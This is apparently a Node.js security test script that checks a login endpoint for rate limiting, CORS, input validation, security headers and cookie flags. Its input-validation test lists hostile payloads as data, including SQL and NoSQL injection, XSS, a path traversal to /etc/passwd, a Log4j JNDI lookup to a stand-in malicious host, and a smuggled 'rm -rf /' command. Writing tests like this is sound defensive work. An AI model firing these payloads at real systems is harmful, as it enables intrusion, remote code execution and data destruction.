#!/usr/bin/env node

/**
 * Security Test Runner for Login Page Authentication
 * This script executes comprehensive security tests to validate identified vulnerabilities
 */

const https = require('https');
const http = require('http');

// Configuration
const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
const TEST_USER_EMAIL = 'test@example.com';
const TEST_USER_PASSWORD = 'testpassword123';

class SecurityTester {
  constructor() {
    this.results = {
      rateLimiting: [],
      cors: [],
      inputValidation: [],
      securityHeaders: {},
      sessionSecurity: {},
      summary: {}
    };
  }

  // Helper function to make HTTP requests
  async makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      const lib = url.startsWith('https') ? https : http;
      const req = lib.request(url, options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            data: data
          });
        });
      });
      
      req.on('error', reject);
      if (options.body) {
        req.write(options.body);
      }
      req.end();
    });
  }

  // Test 1: Rate Limiting Test
  async testRateLimiting() {
    console.log('🔒 Testing Rate Limiting Protection...');
    
    const attempts = [];
    const startTime = Date.now();
    
    for (let i = 0; i < 15; i++) {
      try {
        const response = await this.makeRequest(`${BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Security-Test-Runner/1.0'
          },
          body: JSON.stringify({
            email: `attacker${i}@malicious.com`,
            password: 'wrongpassword'
          })
        });
        
        attempts.push({
          attempt: i + 1,
          status: response.status,
          rateLimited: response.status === 429,
          hasRateLimitHeaders: !!response.headers['x-ratelimit-limit'] || 
                               !!response.headers['retry-after'] ||
                               !!response.headers['x-ratelimit-remaining'],
          responseTime: Date.now() - startTime
        });
        
        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        attempts.push({
          attempt: i + 1,
          error: error.message
        });
      }
    }
    
    this.results.rateLimiting = attempts;
    
    const isProtected = attempts.some(a => a.rateLimited) || 
                       attempts.some(a => a.hasRateLimitHeaders);
    
    console.log(`Rate Limiting: ${isProtected ? '✅ PROTECTED' : '❌ VULNERABLE'}`);
    return isProtected;
  }

  // Test 2: CORS Security Test
  async testCORSSecurity() {
    console.log('🌐 Testing CORS Security...');
    
    const testOrigins = [
      'http://malicious.com',
      'http://localhost:3001',
      'http://evil-site.com',
      'https://phishing-site.com',
      'null'
    ];
    
    const results = [];
    
    for (const origin of testOrigins) {
      try {
        const response = await this.makeRequest(`${BASE_URL}/api/auth/login`, {
          method: 'OPTIONS',
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'Content-Type, Authorization'
          }
        });
        
        const allowOrigin = response.headers['access-control-allow-origin'];
        const allowMethods = response.headers['access-control-allow-methods'];
        const allowHeaders = response.headers['access-control-allow-headers'];
        
        results.push({
          origin,
          allowed: allowOrigin === '*' || allowOrigin === origin,
          allowOrigin,
          allowMethods,
          allowHeaders,
          status: response.status
        });
        
      } catch (error) {
        results.push({
          origin,
          error: error.message
        });
      }
    }
    
    this.results.cors = results;
    
    const hasWildcardCORS = results.some(r => r.allowOrigin === '*');
    const allowsMaliciousOrigins = results.some(r => 
      r.allowed && (r.origin.includes('malicious') || r.origin.includes('evil') || r.origin.includes('phishing'))
    );
    
    const isSecure = !hasWildcardCORS && !allowsMaliciousOrigins;
    
    console.log(`CORS Security: ${isSecure ? '✅ SECURE' : '❌ VULNERABLE'}`);
    return isSecure;
  }

  // Test 3: Input Validation Test
  async testInputValidation() {
    console.log('🛡️ Testing Input Validation...');
    
    const maliciousInputs = [
      {
        name: 'SQL Injection',
        payload: {
          email: "test' OR '1'='1'--",
          password: "password' OR '1'='1'--"
        }
      },
      {
        name: 'XSS in Email',
        payload: {
          email: "<script>alert('XSS')</script>@example.com",
          password: "password"
        }
      },
      {
        name: 'XSS in Password',
        payload: {
          email: "test@example.com",
          password: "<img src=x onerror=alert('XSS')>"
        }
      },
      {
        name: 'Path Traversal',
        payload: {
          email: "test@example.com",
          password: "../../../etc/passwd"
        }
      },
      {
        name: 'Log4j Injection',
        payload: {
          email: "test@example.com",
          password: "${jndi:ldap://malicious.com/exploit}"
        }
      },
      {
        name: 'Command Injection',
        payload: {
          email: "test@example.com",
          password: "test; rm -rf /"
        }
      },
      {
        name: 'NoSQL Injection',
        payload: {
          email: {"$ne": ""},
          password: "password"
        }
      }
    ];
    
    const results = [];
    
    for (const test of maliciousInputs) {
      try {
        const response = await this.makeRequest(`${BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(test.payload)
        });
        
        results.push({
          testName: test.name,
          payload: JSON.stringify(test.payload),
          status: response.status,
          rejected: response.status === 400,
          serverError: response.status >= 500,
          validationError: response.data?.includes('Invalid input') || 
                           response.data?.includes('validation')
        });
        
      } catch (error) {
        results.push({
          testName: test.name,
          payload: JSON.stringify(test.payload),
          error: error.message
        });
      }
    }
    
    this.results.inputValidation = results;
    
    const allInputsValidated = results.every(r => r.rejected || r.validationError);
    const hasServerErrors = results.some(r => r.serverError);
    
    const isSecure = allInputsValidated && !hasServerErrors;
    
    console.log(`Input Validation: ${isSecure ? '✅ SECURE' : '❌ VULNERABLE'}`);
    return isSecure;
  }

  // Test 4: Security Headers Test
  async testSecurityHeaders() {
    console.log('🔐 Testing Security Headers...');
    
    try {
      const response = await this.makeRequest(`${BASE_URL}/api/auth/login`, {
        method: 'OPTIONS'
      });
      
      const securityHeaders = {
        'Content-Security-Policy': response.headers['content-security-policy'],
        'X-Frame-Options': response.headers['x-frame-options'],
        'X-Content-Type-Options': response.headers['x-content-type-options'],
        'X-XSS-Protection': response.headers['x-xss-protection'],
        'Strict-Transport-Security': response.headers['strict-transport-security'],
        'Referrer-Policy': response.headers['referrer-policy'],
        'Permissions-Policy': response.headers['permissions-policy']
      };
      
      this.results.securityHeaders = securityHeaders;
      
      const presentHeaders = Object.values(securityHeaders).filter(h => h !== undefined).length;
      const criticalHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options'
      ];
      
      const hasCriticalHeaders = criticalHeaders.every(h => securityHeaders[h]);
      
      const securityLevel = presentHeaders >= 4 ? 'HIGH' : 
                           presentHeaders >= 2 ? 'MEDIUM' : 'LOW';
      
      console.log(`Security Headers: ${securityLevel} (${presentHeaders}/7 present)`);
      console.log(`Critical Headers: ${hasCriticalHeaders ? '✅ PRESENT' : '❌ MISSING'}`);
      
      return hasCriticalHeaders;
      
    } catch (error) {
      console.error('Security headers test failed:', error);
      return false;
    }
  }

  // Test 5: Session Security Test
  async testSessionSecurity() {
    console.log('🔑 Testing Session Security...');
    
    try {
      const response = await this.makeRequest(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: TEST_USER_EMAIL,
          password: TEST_USER_PASSWORD
        })
      });
      
      const setCookieHeader = response.headers['set-cookie'];
      
      if (!setCookieHeader) {
        this.results.sessionSecurity = {
          error: 'No session cookie set'
        };
        console.log('Session Security: ❌ NO COOKIE');
        return false;
      }
      
      const cookieAnalysis = {
        hasHttpOnly: setCookieHeader.includes('HttpOnly'),
        hasSecure: setCookieHeader.includes('Secure'),
        hasSameSite: setCookieHeader.includes('SameSite'),
        sameSiteValue: setCookieHeader.match(/SameSite=([^;]+)/)?.[1] || 'Not set',
        hasExpires: setCookieHeader.includes('Expires'),
        hasPath: setCookieHeader.includes('Path')
      };
      
      this.results.sessionSecurity = {
        cookieHeader: setCookieHeader,
        security: cookieAnalysis
      };
      
      const isSecure = cookieAnalysis.hasHttpOnly && 
                      cookieAnalysis.hasSecure && 
                      cookieAnalysis.hasSameSite;
      
      console.log(`Session Security: ${isSecure ? '✅ SECURE' : '❌ VULNERABLE'}`);
      console.log(`HttpOnly: ${cookieAnalysis.hasHttpOnly ? '✅' : '❌'}`);
      console.log(`Secure: ${cookieAnalysis.hasSecure ? '✅' : '❌'}`);
      console.log(`SameSite: ${cookieAnalysis.hasSameSite ? '✅' : '❌'} (${cookieAnalysis.sameSiteValue})`);
      
      return isSecure;
      
    } catch (error) {
      console.error('Session security test failed:', error);
      return false;
    }
  }

  // Run all tests
  async runAllTests() {
    console.log('🚀 Starting Comprehensive Security Audit\n');
    console.log(`Target: ${BASE_URL}`);
    console.log('========================================\n');
    
    const testResults = {
      rateLimiting: await this.testRateLimiting(),
      corsSecurity: await this.testCORSSecurity(),
      inputValidation: await this.testInputValidation(),
      securityHeaders: await this.testSecurityHeaders(),
      sessionSecurity: await this.testSessionSecurity()
    };
    
    // Calculate overall security score
    const passedTests = Object.values(testResults).filter(Boolean).length;
    const totalTests = Object.keys(testResults).length;
    const securityScore = Math.round((passedTests / totalTests) * 100);
    
    console.log('\n========================================');
    console.log('📊 SECURITY AUDIT SUMMARY');
    console.log('========================================');
    console.log(`Overall Security Score: ${securityScore}/100`);
    console.log(`Tests Passed: ${passedTests}/${totalTests}`);
    
    const severity = securityScore >= 80 ? 'HIGH' : 
                    securityScore >= 60 ? 'MEDIUM' : 'LOW';
    
    console.log(`Security Level: ${severity}`);
    
    if (securityScore < 80) {
      console.log('\n⚠️ CRITICAL ISSUES FOUND:');
      if (!testResults.rateLimiting) console.log('- Rate limiting not implemented');
      if (!testResults.corsSecurity) console.log('- CORS misconfigured');
      if (!testResults.inputValidation) console.log('- Input validation insufficient');
      if (!testResults.securityHeaders) console.log('- Security headers missing');
      if (!testResults.sessionSecurity) console.log('- Session security weak');
    }
    
    // Save detailed results
    this.results.summary = {
      securityScore,
      severity,
      testsPassed: passedTests,
      totalTests,
      timestamp: new Date().toISOString()
    };
    
    console.log('\n📄 Detailed results saved to results object');
    return this.results;
  }
}

// Export for module usage
module.exports = SecurityTester;

// Run if called directly
if (require.main === module) {
  const tester = new SecurityTester();
  tester.runAllTests()
    .then(results => {
      console.log('\n✅ Security audit completed');
      process.exit(0);
    })
    .catch(error => {
      console.error('❌ Security audit failed:', error);
      process.exit(1);
    });
}